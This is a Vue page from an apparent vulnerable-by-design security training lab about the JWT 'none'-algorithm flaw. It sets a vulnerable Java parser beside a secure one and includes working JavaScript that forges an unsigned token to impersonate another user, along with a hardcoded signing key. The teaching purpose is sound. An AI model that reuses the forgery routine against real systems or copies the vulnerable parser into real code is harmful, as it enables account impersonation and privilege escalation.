<template>
    <div class="root-div">
        <div class="vuln-info">
            <div class="header-div">JWT安全漏洞 -- JWT None算法漏洞</div>
            <div class="body-div">
                <el-tabs v-model="activeName" @tab-click="handleClick">
                    <el-tab-pane label="漏洞描述" name="first">
                        <div class="vuln-detail">
                            JWT None算法漏洞是指JWT验证过程中没有正确验证签名算法，或者接受没有签名的令牌。<span style="color: red;">攻击者可以修改JWT的Header部分，将算法改为"none"，从而绕过签名验证</span>，伪造JWT令牌。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="漏洞危害" name="second">
                        <div class="vuln-detail">
                            JWT None算法漏洞的危害包括：<br /><br />
                            身份伪造：攻击者可以伪造任意用户的JWT令牌；<br />
                            权限提升：攻击者可以修改JWT中的权限信息；<br />
                            会话劫持：攻击者可以劫持用户的会话；<br />
                            数据篡改：攻击者可以修改JWT中的敏感数据。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="安全编码" name="third">
                        <div class="vuln-detail">
                            【必须】严格验证JWT签名算法<br />
                            验证JWT时必须明确指定允许的签名算法。<br /><br />
                            【必须】拒绝none算法<br />
                            在JWT验证时明确拒绝"none"算法。<br /><br />
                            【建议】使用非对称加密<br />
                            考虑使用RS256等非对称加密算法。<br /><br />
                            【建议】密钥轮换<br />
                            定期更换签名密钥，降低密钥泄露风险。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="参考文章" name="fourth">
                        <div class="vuln-detail">
                            <a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" target="_blank" style="text-decoration: underline;">《JWT库中的关键漏洞》</a>：了解JWT库中的常见安全漏洞。<br />
                            <a href="https://jwt.io/introduction" target="_blank" style="text-decoration: underline;">《JWT安全最佳实践》</a>：JWT安全配置的详细指南。
                        </div>
                    </el-tab-pane>
                </el-tabs>
            </div>
        </div>
        <div class="code-demo">
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">
                            漏洞代码 - JWT None算法漏洞
                            <div>
                                <el-button type="danger" round size="mini" @click="handleVulnTest">去测试</el-button>
                            </div>
                        </el-row>
                        <pre v-highlightjs><code class="java">// JWT None算法漏洞 - 接受没有签名的令牌
public class JwtSignatureUtils {
    private static String signKey = "K9mN8bV7cX6zA5qW4eR3tY2uI1oP0aS9dF8gH7jK6lZ5xC4vB3nM2qW1eR0tY9uI8oP7aS6dF5gH4jK3lZ2xC1vB0nM9qW8eR7tY6uI5oP4aS3dF2gH1jK0lZ9xC8vB7nM6qW5eR4tY3uI2oP1aS0dF9gH8jK7lZ6xC5vB4nM3qW2eR1tY0uI9oP8aS7dF6gH5jK4lZ3xC2vB1nM0qW9eR8tY7uI6oP5aS4dF3gH2jK1lZ0xC9vB8nM7qW6eR5tY4uI3oP2aS1dF0gH9jK8lZ7xC6vB5nM4qW3eR2tY1uI0oP9aS8dF7gH6jK5lZ4xC3vB2nM1qW0eR9tY8uI7oP6aS5dF4gH3jK2lZ1xC0vB9nM8qW7eR6tY5uI4oP3aS2dF1gH0jK9lZ8xC7vB6nM5qW4eR3tY2uI1oP0aS9dF8gH7jK6lZ5x";
    private static Long expire = 3600000L; // 1小时

    /**
     * JWT 令牌生成方法 - 正常生成
     * @param claims JWT第二部分载荷，payload中存储的内容
     * @return
     */
    public static String generateJwt(Map&lt;String, Object&gt; claims) {
        String jwttoken = Jwts.builder()
                .signWith(SignatureAlgorithm.HS256, signKey)
                .setClaims(claims)
                .setExpiration(new Date(System.currentTimeMillis() + expire))
                .compact();

        return jwttoken;
    }

    /**
     * JWT 令牌解析方法 - 漏洞实现（接受没有签名的令牌）
     * @param jwttoken
     * @return
     */
    public static Claims parseVulnJwt(String jwttoken) {
        // 漏洞：接受没有签名的令牌
        // 重点是使用 .parse() 方法而不是 .parseClaimsJws()
        Jwt jwt = Jwts.parser()
            .setSigningKey(signKey)
            .parse(jwttoken);

        return (Claims) jwt.getBody();
    }
}</code></pre>
                    </div>
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">
                            安全代码 - JWT安全签名
                            <div>
                                <el-button type="success" round size="mini" @click="handleSecureTest">去测试</el-button>
                            </div>
                        </el-row>
                        <pre v-highlightjs><code class="java">// JWT安全实现 - 严格验证签名
public class JwtSignatureUtils {
    private static String signKey = "K9mN8bV7cX6zA5qW4eR3tY2uI1oP0aS9dF8gH7jK6lZ5xC4vB3nM2qW1eR0tY9uI8oP7aS6dF5gH4jK3lZ2xC1vB0nM9qW8eR7tY6uI5oP4aS3dF2gH1jK0lZ9xC8vB7nM6qW5eR4tY3uI2oP1aS0dF9gH8jK7lZ6xC5vB4nM3qW2eR1tY0uI9oP8aS7dF6gH5jK4lZ3xC2vB1nM0qW9eR8tY7uI6oP5aS4dF3gH2jK1lZ0xC9vB8nM7qW6eR5tY4uI3oP2aS1dF0gH9jK8lZ7xC6vB5nM4qW3eR2tY1uI0oP9aS8dF7gH6jK5lZ4xC3vB2nM1qW0eR9tY8uI7oP6aS5dF4gH3jK2lZ1xC0vB9nM8qW7eR6tY5uI4oP3aS2dF1gH0jK9lZ8xC7vB6nM5qW4eR3tY2uI1oP0aS9dF8gH7jK6lZ5x";
    private static Long expire = 3600000L; // 1小时

    /**
     * JWT 令牌生成方法 - 正常生成
     * @param claims JWT第二部分载荷，payload中存储的内容
     * @return
     */
    public static String generateJwt(Map&lt;String, Object&gt; claims) {
        String jwttoken = Jwts.builder()
                .signWith(SignatureAlgorithm.HS256, signKey)
                .setClaims(claims)
                .setExpiration(new Date(System.currentTimeMillis() + expire))
                .compact();

        return jwttoken;
    }

    /**
     * JWT 令牌解析方法 - 安全实现（严格验证签名）
     * @param jwttoken
     * @return
     */
    public static Claims parseSecureJwt(String jwttoken) {
        // .parseClaimsJws() 方法严格验证签名，拒绝none算法
        Claims claims = Jwts.parser()
                .setSigningKey(signKey)
                .parseClaimsJws(jwttoken)
                .getBody();

        return claims;
    }
}</code></pre>
                    </div>
                </el-col>
            </el-row>
        </div>

        <!-- JWT None算法漏洞测试对话框 -->
        <el-dialog :visible.sync="vulnTestDialogVisible" width="800px" :show-close="true" :close-on-click-modal="true" @close="handleVulnDialogClose">
            <div slot="title" style="text-align: center; font-size: 18px;">
                JWT None算法漏洞测试
            </div>
            <div class="test-container">
                <!-- 1. 登录部分 -->
                <div class="test-section">
                    <h3>1. 用户登录 <span style="color: red; font-size: 14px; font-weight: normal;">(测试账号: zhangsan/123)</span></h3>
                    <el-form :model="loginForm" :rules="loginRules" ref="loginForm" label-width="80px" inline>
                        <el-form-item label="用户名" prop="username">
                            <el-input v-model="loginForm.username" placeholder="请输入用户名" style="width: 200px;"></el-input>
                        </el-form-item>
                        <el-form-item label="密码" prop="password">
                            <el-input v-model="loginForm.password" type="password" placeholder="请输入密码" style="width: 200px;"></el-input>
                        </el-form-item>
                        <el-form-item>
                            <el-button type="primary" @click="handleVulnLogin">登录</el-button>
                        </el-form-item>
                    </el-form>
                </div>

                <!-- 2. JWT校验测试 -->
                <div class="test-section">
                    <h3>2. JWT校验测试</h3>
                    <div class="jwt-input-section">
                        <el-input
                            v-model="jwtToken"
                            type="textarea"
                            :rows="3"
                            placeholder="JWT Token将在这里显示"
                            readonly>
                        </el-input>
                    </div>
                    <div class="jwt-test-buttons">
                        <el-button type="primary" @click="handleVerifyOriginalJwt" :disabled="!jwtToken">
                            校验原始JWT
                        </el-button>
                    </div>
                    <div v-if="verifyResult" class="result-box">
                        <el-alert
                            :title="verifyResult.success ? '校验成功' : '校验失败'"
                            :description="verifyResult.message"
                            :type="verifyResult.success ? 'success' : 'error'"
                            show-icon>
                        </el-alert>
                    </div>
                </div>

                <!-- 3. 校验篡改JWT -->
                <div class="test-section">
                    <h3>3. 校验篡改JWT <span style="color: red; font-size: 14px; font-weight: normal;">(篡改为用户lisi)</span></h3>
                    <div class="jwt-input-section">
                        <el-input
                            v-model="tamperedJwtToken"
                            type="textarea"
                            :rows="3"
                            placeholder="篡改的JWT Token将在这里显示"
                            readonly>
                        </el-input>
                    </div>
                    <div class="jwt-test-buttons">
                        <el-button type="warning" @click="handleVerifyTamperedJwt" :disabled="!tamperedJwtToken">
                            校验篡改JWT
                        </el-button>
                    </div>
                    <div v-if="tamperedVerifyResult" class="result-box">
                        <el-alert
                            :title="tamperedVerifyResult.success ? '校验成功' : '校验失败'"
                            :description="tamperedVerifyResult.message"
                            :type="tamperedVerifyResult.success ? 'success' : 'error'"
                            show-icon>
                        </el-alert>
                    </div>
                </div>

                <!-- 4. 攻击测试 -->
                <div class="test-section">
                    <h3>4. 攻击测试</h3>
                    <p>点击按钮生成篡改的JWT（使用none算法）：</p>
                    <div class="attack-buttons">
                        <el-button type="danger" @click="handleTamperJwt" :disabled="!jwtToken">
                            篡改JWT
                        </el-button>
                    </div>
                    <div v-if="tamperResult" class="result-box">
                        <el-alert
                            :title="tamperResult.success ? '篡改成功' : '篡改失败'"
                            :description="tamperResult.message"
                            :type="tamperResult.success ? 'success' : 'error'"
                            show-icon>
                        </el-alert>
                    </div>
                </div>
            </div>
        </el-dialog>

        <!-- JWT安全实现测试对话框 -->
        <el-dialog :visible.sync="secureTestDialogVisible" width="800px" :show-close="true" :close-on-click-modal="true" @close="handleSecureDialogClose">
            <div slot="title" style="text-align: center; font-size: 18px;">
                JWT安全实现测试
            </div>
            <div class="test-container">
                <!-- 1. 登录部分 -->
                <div class="test-section">
                    <h3>1. 用户登录 <span style="color: red; font-size: 14px; font-weight: normal;">(测试账号: zhangsan/123)</span></h3>
                    <el-form :model="loginForm" :rules="loginRules" ref="loginForm2" label-width="80px" inline>
                        <el-form-item label="用户名" prop="username">
                            <el-input v-model="loginForm.username" placeholder="请输入用户名" style="width: 200px;"></el-input>
                        </el-form-item>
                        <el-form-item label="密码" prop="password">
                            <el-input v-model="loginForm.password" type="password" placeholder="请输入密码" style="width: 200px;"></el-input>
                        </el-form-item>
                        <el-form-item>
                            <el-button type="primary" @click="handleSecureLogin">登录</el-button>
                        </el-form-item>
                    </el-form>
                </div>

                <!-- 2. JWT校验测试 -->
                <div class="test-section">
                    <h3>2. JWT校验测试</h3>
                    <div class="jwt-input-section">
                        <el-input
                            v-model="secureJwtToken"
                            type="textarea"
                            :rows="3"
                            placeholder="JWT Token将在这里显示"
                            readonly>
                        </el-input>
                    </div>
                    <div class="jwt-test-buttons">
                        <el-button type="primary" @click="handleSecureVerifyOriginalJwt" :disabled="!secureJwtToken">
                            校验原始JWT
                        </el-button>
                    </div>
                    <div v-if="secureVerifyResult" class="result-box">
                        <el-alert
                            :title="secureVerifyResult.success ? '校验成功' : '校验失败'"
                            :description="secureVerifyResult.message"
                            :type="secureVerifyResult.success ? 'success' : 'error'"
                            show-icon>
                        </el-alert>
                    </div>
                </div>

                <!-- 3. 校验篡改JWT -->
                <div class="test-section">
                    <h3>3. 校验篡改JWT <span style="color: red; font-size: 14px; font-weight: normal;">(篡改为用户lisi)</span></h3>
                    <div class="jwt-input-section">
                        <el-input
                            v-model="secureTamperedJwtToken"
                            type="textarea"
                            :rows="3"
                            placeholder="篡改的JWT Token将在这里显示"
                            readonly>
                        </el-input>
                    </div>
                    <div class="jwt-test-buttons">
                        <el-button type="warning" @click="handleSecureVerifyTamperedJwt" :disabled="!secureTamperedJwtToken">
                            校验篡改JWT
                        </el-button>
                    </div>
                    <div v-if="secureTamperedVerifyResult" class="result-box">
                        <el-alert
                            :title="secureTamperedVerifyResult.success ? '校验成功' : '校验失败'"
                            :description="secureTamperedVerifyResult.message"
                            :type="secureTamperedVerifyResult.success ? 'success' : 'error'"
                            show-icon>
                        </el-alert>
                    </div>
                </div>

                <!-- 4. 攻击测试 -->
                <div class="test-section">
                    <h3>4. 攻击测试</h3>
                    <p>尝试篡改JWT（安全实现会拒绝）：</p>
                    <div class="attack-buttons">
                        <el-button type="danger" @click="handleSecureTamperJwt" :disabled="!secureJwtToken">
                            篡改JWT
                        </el-button>
                    </div>
                    <div v-if="secureTamperResult" class="result-box">
                        <el-alert
                            :title="secureTamperResult.success ? '篡改成功' : '篡改失败'"
                            :description="secureTamperResult.message"
                            :type="secureTamperResult.success ? 'success' : 'error'"
                            show-icon>
                        </el-alert>
                    </div>
                </div>
            </div>
        </el-dialog>
    </div>
</template>

<script>
import { jwtSignatureVulnLogin, jwtSignatureVulnGetInfo, jwtSignatureSecureLogin, jwtSignatureSecureGetInfo } from '@/api/jwt'
import { Base64 } from 'js-base64'

export default {
    data() {
        return {
            activeName: 'first',
            vulnTestDialogVisible: false,
            secureTestDialogVisible: false,
            loginForm: {
                username: '',
                password: ''
            },
            loginRules: {
                username: [
                    { required: true, message: '请输入用户名', trigger: 'blur' }
                ],
                password: [
                    { required: true, message: '请输入密码', trigger: 'blur' }
                ]
            },
            jwtToken: '',
            secureJwtToken: '',
            tamperedJwtToken: '',
            secureTamperedJwtToken: '',
            verifyResult: null,
            secureVerifyResult: null,
            tamperedVerifyResult: null,
            secureTamperedVerifyResult: null,
            tamperResult: null,
            secureTamperResult: null
        }
    },
    methods: {
        handleClick(tab, event) {
            // console.log(tab, event);
        },
        handleVulnTest() {
            this.vulnTestDialogVisible = true
            this.loginForm.username = 'zhangsan'
            this.loginForm.password = '123'
            this.jwtToken = ''
            this.tamperedJwtToken = ''
            this.verifyResult = null
            this.tamperedVerifyResult = null
            this.tamperResult = null
        },
        handleSecureTest() {
            this.secureTestDialogVisible = true
            this.loginForm.username = 'zhangsan'
            this.loginForm.password = '123'
            this.secureJwtToken = ''
            this.secureTamperedJwtToken = ''
            this.secureVerifyResult = null
            this.secureTamperedVerifyResult = null
            this.secureTamperResult = null
        },
        handleVulnLogin() {
            this.$refs.loginForm.validate((valid) => {
                if (valid) {
                    jwtSignatureVulnLogin(this.loginForm).then(response => {
                        this.jwtToken = response.data
                        localStorage.setItem('jwt', response.data)
                        this.$message.success('登录成功，JWT已生成')
                    }).catch(error => {
                        if (error.message && error.message !== 'Error' && error.message !== 'error') {
                            this.$message.error('登录失败：' + error.message)
                        }
                    })
                }
            })
        },
        handleSecureLogin() {
            this.$refs.loginForm2.validate((valid) => {
                if (valid) {
                    jwtSignatureSecureLogin(this.loginForm).then(response => {
                        this.secureJwtToken = response.data
                        localStorage.setItem('jwt', response.data)
                        this.$message.success('登录成功，JWT已生成')
                    }).catch(error => {
                        if (error.message && error.message !== 'Error' && error.message !== 'error') {
                            this.$message.error('登录失败：' + error.message)
                        }
                    })
                }
            })
        },
        handleVerifyOriginalJwt() {
            if (!this.jwtToken) {
                this.$message.warning('请先登录获取JWT Token')
                return
            }
            
            jwtSignatureVulnGetInfo().then(response => {
                this.verifyResult = {
                    success: true,
                    message: '原始JWT校验成功，用户信息：' + response.data.username
                }
            }).catch(error => {
                this.verifyResult = {
                    success: false,
                    message: '原始JWT校验失败：' + error.message
                }
            })
        },
        handleVerifyTamperedJwt() {
            if (!this.tamperedJwtToken) {
                this.$message.warning('请先生成篡改的JWT Token')
                return
            }
            
            const originalJwt = localStorage.getItem('jwt')
            localStorage.setItem('jwt', this.tamperedJwtToken)
            
            jwtSignatureVulnGetInfo().then(response => {
                this.tamperedVerifyResult = {
                    success: true,
                    message: '篡改JWT验证成功，用户信息：' + response.data.username
                }
                if (originalJwt) {
                    localStorage.setItem('jwt', originalJwt)
                } else {
                    localStorage.removeItem('jwt')
                }
            }).catch(error => {
                this.tamperedVerifyResult = {
                    success: false,
                    message: '篡改JWT验证失败：' + error.message
                }
                if (originalJwt) {
                    localStorage.setItem('jwt', originalJwt)
                } else {
                    localStorage.removeItem('jwt')
                }
            })
        },
        handleTamperJwt() {
            if (!this.jwtToken) {
                this.$message.warning('请先登录获取JWT Token')
                return
            }
            
            try {
                const parts = this.jwtToken.split('.')
                if (parts.length !== 3) {
                    throw new Error('无效的JWT格式')
                }
                
                const header = JSON.parse(Base64.decode(parts[0]))
                const payload = JSON.parse(Base64.decode(parts[1]))
                
                // 修改header为none算法
                const tamperedHeader = {
                    ...header,
                    alg: "none"
                }
                
                // 修改payload中的用户信息
                const tamperedPayload = {
                    ...payload,
                    name: "李四",
                    id: 2,
                    username: "lisi"
                }
                
                // 使用Base64编码并移除填充字符
                const tamperedHeaderBase64 = Base64.encode(JSON.stringify(tamperedHeader)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '')
                const tamperedPayloadBase64 = Base64.encode(JSON.stringify(tamperedPayload)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '')
                
                // 生成篡改的JWT（使用none算法，不需要签名）
                const tamperedJwt = `${tamperedHeaderBase64}.${tamperedPayloadBase64}.`
                console.log(tamperedJwt)
                
                this.tamperedJwtToken = tamperedJwt
                this.tamperResult = {
                    success: true,
                    message: 'JWT篡改成功！已修改用户信息为：李四(id=2, username=lisi)'
                }
                
                this.$message.success('JWT篡改成功')
            } catch (error) {
                this.tamperResult = {
                    success: false,
                    message: 'JWT篡改失败：' + error.message
                }
                this.$message.error('JWT篡改失败：' + error.message)
            }
        },
        handleSecureVerifyOriginalJwt() {
            if (!this.secureJwtToken) {
                this.$message.warning('请先登录获取JWT Token')
                return
            }
            
            jwtSignatureSecureGetInfo().then(response => {
                this.secureVerifyResult = {
                    success: true,
                    message: '原始JWT校验成功，用户信息：' + response.data.username
                }
            }).catch(error => {
                this.secureVerifyResult = {
                    success: false,
                    message: '原始JWT校验失败：' + error.message
                }
            })
        },
        handleSecureVerifyTamperedJwt() {
            if (!this.secureTamperedJwtToken) {
                this.$message.warning('请先生成篡改的JWT Token')
                return
            }
            
            const originalJwt = localStorage.getItem('jwt')
            localStorage.setItem('jwt', this.secureTamperedJwtToken)
            
            jwtSignatureSecureGetInfo().then(response => {
                this.secureTamperedVerifyResult = {
                    success: true,
                    message: '篡改JWT验证成功，用户信息：' + response.data.username
                }
                if (originalJwt) {
                    localStorage.setItem('jwt', originalJwt)
                } else {
                    localStorage.removeItem('jwt')
                }
            }).catch(error => {
                this.secureTamperedVerifyResult = {
                    success: false,
                    message: '篡改JWT验证失败：' + error.message
                }
                if (originalJwt) {
                    localStorage.setItem('jwt', originalJwt)
                } else {
                    localStorage.removeItem('jwt')
                }
            })
        },
        handleSecureTamperJwt() {
            if (!this.secureJwtToken) {
                this.$message.warning('请先登录获取JWT Token')
                return
            }
            
            try {
                const parts = this.secureJwtToken.split('.')
                if (parts.length !== 3) {
                    throw new Error('无效的JWT格式')
                }
                
                const header = JSON.parse(Base64.decode(parts[0]))
                const payload = JSON.parse(Base64.decode(parts[1]))
                
                // 修改header为none算法
                const tamperedHeader = {
                    ...header,
                    alg: "none"
                }
                
                // 修改payload中的用户信息
                const tamperedPayload = {
                    ...payload,
                    name: "李四",
                    id: 2,
                    username: "lisi"
                }
                
                // 使用Base64编码并移除填充字符
                const tamperedHeaderBase64 = Base64.encode(JSON.stringify(tamperedHeader)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '')
                const tamperedPayloadBase64 = Base64.encode(JSON.stringify(tamperedPayload)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '')
                
                // 生成篡改的JWT（使用none算法，不需要签名）
                const tamperedJwt = `${tamperedHeaderBase64}.${tamperedPayloadBase64}.`
                
                this.secureTamperedJwtToken = tamperedJwt
                this.secureTamperResult = {
                    success: true,
                    message: 'JWT篡改成功！已修改用户信息为：李四(id=2, username=lisi)'
                }
                
                this.$message.success('JWT篡改成功')
            } catch (error) {
                this.secureTamperResult = {
                    success: false,
                    message: 'JWT篡改失败：' + error.message
                }
                this.$message.error('JWT篡改失败：' + error.message)
            }
        },
        handleVulnDialogClose() {
            this.jwtToken = ''
            this.tamperedJwtToken = ''
            this.verifyResult = null
            this.tamperedVerifyResult = null
            this.tamperResult = null
            localStorage.removeItem('jwt')
        },
        handleSecureDialogClose() {
            this.secureJwtToken = ''
            this.secureTamperedJwtToken = ''
            this.secureVerifyResult = null
            this.secureTamperedVerifyResult = null
            this.secureTamperResult = null
            localStorage.removeItem('jwt')
        }
    }
}
</script>

<style>
.vuln-info {
    border-radius: 10px;
    margin-left: 20px;
    margin-right: 20px;
    margin-bottom: 20px;
    margin-top: 10px;
}

.header-div {
    font-size: 24px;
    color: #409EFF;
    font-weight: bold;
    padding: 10px;
    justify-content: center;
    align-items: center;
    border-bottom: 1px solid #ccc;
}

.body-div {
    padding: 10px;
    justify-content: center;
    align-items: center;
    font-family: Arial, sans-serif;
    font-size: 14px;
}

.vuln-detail {
    background-color: #dce9f8;
    padding: 10px;
}

.code-demo {
    margin: 20px;
    border-top: 1px solid #ccc;
    padding-top: 20px;
}

pre code {
    font-size: 12px;
}

.el-row {
    margin-bottom: 20px;
}

.el-row:last-child {
    margin-bottom: 0;
}

.el-col {
    border-radius: 4px;
}

.bg-purple-dark {
    background: #99a9bf;
}

.bg-purple {
    background: #d3dce6;
}

.bg-purple-light {
    background: #e5e9f2;
}

.grid-content {
    border-radius: 4px;
    height: 100%;
    padding: 10px;
}

.grid-flex {
    display: flex;
    align-items: stretch;
}

.row-bg {
    padding: 10px 0;
    background-color: #f9fafc;
}

.test-container {
    padding: 20px;
}

.test-section {
    margin-bottom: 30px;
    padding: 20px;
    border: 1px solid #e4e7ed;
    border-radius: 8px;
    background-color: #fafafa;
}

.test-section h3 {
    margin-top: 0;
    margin-bottom: 15px;
    color: #409EFF;
    font-size: 16px;
}

.jwt-input-section {
    margin-bottom: 15px;
}

.jwt-test-buttons {
    margin-bottom: 15px;
}

.jwt-test-buttons .el-button {
    margin-right: 10px;
}

.attack-buttons {
    margin-bottom: 15px;
}

.attack-buttons .el-button {
    margin-right: 10px;
}

.result-box {
    margin-top: 15px;
}
</style>
